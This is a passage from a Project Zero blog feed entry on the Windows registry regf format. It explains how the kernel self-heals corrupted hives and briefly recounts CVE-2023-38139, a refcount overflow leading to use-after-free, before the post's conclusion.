class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;if any irrecoverable problem is found in a subkey index, it is deleted, and the subkey list of its associated key is cleared.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Security descriptor list reset:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;if any errors are detected in the list of security descriptors (bad Flink/Blink indexes or invalid binary format), the set of descriptors in the hive is reduced to the single root descriptor, which will then be inherited by all the keys in the hive.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;Rejection of entire hive:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;if any issues are found with the fundamental parts of the regf format or its properties (heavily corrupted header, missing bins, invalid root key, invalid root security descriptor), the loading of the hive is completely aborted.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;As we can see, Windows implements a very defensive strategy and always attempts to either fix the corrupted data, or isolate the damage by deleting the affected object while preserving the overall hive integrity. Only when these repair attempts are exhausted does the kernel abort the loading process and return an error. This resilience can lead to situations where a freshly loaded hive is already in a &amp;quot;dirty&amp;quot; state, requiring the system to immediately flush its self-applied corrections to disk to maintain consistency.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;One particularly interesting bug related to the self-healing process was &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451601&quot;&gt;CVE-2023-38139&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. To reproduce the issue, the self-healing&lt;/span&gt;&lt;span&gt;&amp;nbsp;logic would have to be triggered a large number of times (in the case of my PoC, 65535 times) in order to cause a 32-bit integer overflow of a security descriptor refcount, and later a UAF condition. I have also abused the behavior to demonstrate &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://github.com/googleprojectzero/p0tools/tree/master/WinRegLowSeverityBugs/Reports/13_CmpLightWeightPrepareSetSecDescUoW_security_list_confusion&quot;&gt;WinRegLowSeverityBugs #13&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;, in which a key with an empty name would be removed during load, freeing up a reference to a security descriptor and resulting in the refcount being equal to zero upon loading. Overall, the self-healing property of the registry is not the most critical, but one that I find quite fascinating and certainly worth keeping in mind as part of one&amp;#39;s toolbox when researching this subsystem.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;MvcjwGOuIU-c70 MvcjwGOuIU-c12&quot; id=&quot;h.pj4welz7cmm3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c40&quot;&gt;Conclusion&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;Congratulations on reaching the end!&lt;/span&gt;&lt;span&gt;&amp;nbsp;This post aimed to systematically explore the inner workings of the regf format, focusing on the hard requirements enforced by Windows&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;. Due to my role and interests, I looked at the format from a strictly security-oriented angle rather than digital forensics, which is the context in which registry hives are typically considered. Hopefully, this deep dive clarifies some of the intricacies of the hive format and complements existing unofficial documentation.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;Keep in mind that hives store their data in the regf files on disk, but Windows also creates multiple auxiliary kernel objects for managing and caching this data once loaded. The next post in the series will discuss these various objects, their relationships, lifecycle, and, naturally, their impact on system security. Stay tuned!&lt;/span&gt;&lt;/p&gt;</content><link rel='replies' type='application/atom+xml' href='https://googleprojectzero.blogspot.com/feeds/5470414558693895520/comments/default' title='Post Comments'/><link rel='replies' type='text/html' href='https://googleprojectzero.blogspot.com/2024/12/the-windows-registry-adventure-5-regf.html#comment-form' title='0 Comments'/><link rel='edit' type='application/atom+xml' href='https://www.blogger.com/feeds/4838136820032157985/posts/default/5470414558693895520'/><link rel='self' type='application/atom+xml' href='https://www.blogger.com/feeds/4838136820032157985/posts/default/5470414558693895520'/><link rel='alternate' type='text/html' href='https://googleprojectzero.blogspot.com/2024/12/the-windows-registry-adventure-5-regf.html' title='The Windows Registry Adventure #5: The regf file format'/><author><name>Google Project Zero</name><uri>http://www.blogger.com/profile/08975904405228580347</uri><email>noreply@blogger.com</email><gd:image rel='http://schemas.google.com/g/2005#thumbnail' width='16' height='16' src='https://img1.blogblog.com/img/b16-rounded.gif'/></author><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiQtJm0XNkozXGxjQnB9n1ka9OuxP7lrLSQN1KZF-Zc60Z06dBEz3AAA8aAYnmdrU4imLebCFvF6qXaE0h-uA_iXnuyAisG90JWawSAMPPaToLdXMGeC4FlyGz42FWkf1bPhJmwSez8Ot-DLI29n4jinIXswZ-LQoLyWX7PIKVF5EwkRoAXNUFYIdcCOwo/s72-c/image8.png" height="72" width="72"/><thr:total>0</thr:total></entry></feed>